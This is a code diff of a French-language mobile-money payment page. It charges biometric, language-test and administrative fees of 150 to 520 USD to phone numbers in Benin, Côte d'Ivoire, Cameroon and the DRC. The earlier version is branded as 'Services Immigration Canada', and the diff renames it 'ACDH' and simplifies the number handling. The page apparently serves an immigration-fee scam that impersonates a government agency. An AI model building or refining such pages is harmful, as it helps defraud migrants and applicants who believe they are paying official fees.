@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Service Immigration Payement</title>
+<title>Paiement ACDH</title>
 
 <style>
 body{
@@ -44,11 +44,6 @@ button{
   font-weight:bold;
 }
 
-#displayAmount{
-  margin-top:10px;
-  font-weight:bold;
-}
-
 .note{
   font-size:12px;
   color:#666;
@@ -58,7 +53,6 @@ button{
 
 #result{
   margin-top:15px;
-  font-weight:bold;
   padding:10px;
   border-radius:5px;
   background:#f5f5f5;
@@ -68,7 +62,6 @@ button{
   margin-top:20px;
   color:white;
   font-size:12px;
-  text-align:center;
 }
 </style>
 </head>
@@ -79,39 +72,32 @@ button{
 
 <img src="logo.png" class="logo">
 
-<h3>Service Immigration Payement</h3>
+<h3>Paiement ACDH</h3>
 
-<select id="service" onchange="updateAmount()">
+<select id="service">
   <option value="biometrie">Données biométriques - 150 USD</option>
   <option value="langue">Test de langue - 150 USD</option>
   <option value="administratif">Droit administratif - 220 USD</option>
   <option value="total">Tout payer - 520 USD</option>
 </select>
 
-<select id="country" onchange="updateOperators(); updateAmount(); toggleCurrency();">
+<select id="country">
+  <option value="BEN">Bénin</option>
   <option value="CIV">Côte d'Ivoire</option>
   <option value="CMR">Cameroun</option>
   <option value="COD">RDC</option>
-  <option value="COG">Congo</option>
-  <option value="GAB">Gabon</option>
-  <option value="SEN">Sénégal</option>
-  <option value="BEN">Bénin</option>
 </select>
 
-<select id="currency" style="display:none" onchange="updateAmount()">
-  <option value="CDF">CDF</option>
-  <option value="USD">USD</option>
+<select id="operator">
+  <option>MTN</option>
 </select>
 
-<select id="operator"></select>
-
-<input id="phone" placeholder="Entrez votre numéro">
+<!-- 🔥 NUMERO SANS INDICATIF -->
+<input id="phone" placeholder="Ex: 0142222197">
 
 <div class="note">
-⚠️ Entrez uniquement votre numéro sans indicatif (ex: 97XXXXXX)
+⚠️ Entrez uniquement votre numéro sans indicatif
 </div>
-
-<p id="displayAmount"></p>
 
 <button onclick="payer()">Payer</button>
 
@@ -120,149 +106,55 @@ button{
 </div>
 
 <div class="footer">
-© 2026 Services Immigration Canada — Tous droits réservés — Plateforme sécurisée 🔒
+© 2026 ACDH — Plateforme sécurisée 🔒
 </div>
 
 <script>
 
-const services={
-  biometrie:150,
-  langue:150,
-  administratif:220,
-  total:520
-};
-
-const currencies={
-  BEN:"XOF",CIV:"XOF",SEN:"XOF",
-  CMR:"XAF",GAB:"XAF",COG:"XAF",
-  COD:"CDF"
-};
-
-const operators={
-  BEN:["MTN","MOOV"],
-  CMR:["MTN"],
-  CIV:["MTN","ORANGE"],
-  COD:["AIRTEL","ORANGE","VODACOM"],
-  GAB:["AIRTEL"],
-  COG:["AIRTEL","MTN"],
-  SEN:["ORANGE","FREE"]
-};
-
-const prefixes={
+// indicatifs
+const prefixes = {
   BEN:"229",
   CIV:"225",
   CMR:"237",
-  COD:"243",
-  COG:"242",
-  GAB:"241",
-  SEN:"221"
+  COD:"243"
 };
-
-let rates={};
-
-async function loadRates(){
-  const r=await fetch("https://open.er-api.com/v6/latest/USD");
-  rates=(await r.json()).rates;
-}
-
-function updateOperators(){
-
-  operator.innerHTML="";
-
-  operators[country.value].forEach(o=>{
-    let op=document.createElement("option");
-    op.value=o;
-    op.textContent=o;
-    operator.appendChild(op);
-  });
-
-  phone.value = prefixes[country.value];
-}
-
-phone.addEventListener("input",function(){
-  const prefix = prefixes[country.value];
-  if(!this.value.startsWith(prefix)){
-    this.value = prefix;
-  }
-});
-
-phone.addEventListener("keydown",function(e){
-  const prefixLength = prefixes[country.value].length;
-  if(this.selectionStart <= prefixLength && e.key === "Backspace"){
-    e.preventDefault();
-  }
-});
-
-function toggleCurrency(){
-  currency.style.display = country.value==="COD" ? "block":"none";
-}
-
-function updateAmount(){
-
-  const usd=services[service.value];
-
-  let cur = country.value==="COD"
-    ? currency.value
-    : currencies[country.value];
-
-  if(!rates[cur]) return;
-
-  const amt=Math.round(usd*rates[cur]);
-
-  displayAmount.innerText="Montant à payer : "+amt+" "+cur;
-}
 
 async function payer(){
 
-  result.innerText="⏳ Traitement du paiement...";
+  let num = phone.value.trim();
 
-  const res=await fetch("/api/pay",{
+  // 🔥 supprimer si utilisateur met indicatif
+  Object.values(prefixes).forEach(p=>{
+    if(num.startsWith(p)){
+      num = num.substring(p.length);
+    }
+  });
+
+  const fullNumber = prefixes[country.value] + num;
+
+  result.innerText="⏳ Traitement...";
+
+  const res = await fetch("/api/pay",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
-      phone:phone.value,
-      service:service.value,
-      country:country.value,
-      operator:operator.value,
-      currency:currency.value
+      phone: fullNumber,
+      service: service.value,
+      country: country.value,
+      operator: operator.value
     })
   });
 
-  const data=await res.json();
+  const data = await res.json();
 
   if(data.status==="SUCCESS"){
-    result.innerHTML=`
-      ✅ Paiement confirmé<br>
-      💰 Montant payé : ${data.amount} ${data.currency}<br>
-      📲 Merci, votre opération est validée
-    `;
+    result.innerHTML = `✅ Paiement confirmé<br>${data.amount} ${data.currency}`;
+  } else if(data.status==="PENDING"){
+    result.innerHTML = "📲 Vérifiez votre téléphone";
+  } else {
+    result.innerHTML = "❌ Échec du paiement";
   }
-  else if(data.status==="PENDING"){
-    result.innerHTML=`
-      ⏳ Paiement en attente<br>
-      📱 Veuillez valider sur votre téléphone
-    `;
-  }
-  else if(data.status==="ACCEPTED"){
-    result.innerHTML=`
-      📲 Demande envoyée<br>
-      👉 Vérifiez votre téléphone
-    `;
-  }
-  else{
-    result.innerHTML=`
-      ❌ Échec du paiement<br>
-      ⚠️ Veuillez réessayer
-    `;
-  }
-
 }
-
-loadRates().then(()=>{
-  updateOperators();
-  updateAmount();
-  toggleCurrency();
-});
 
 </script>
 
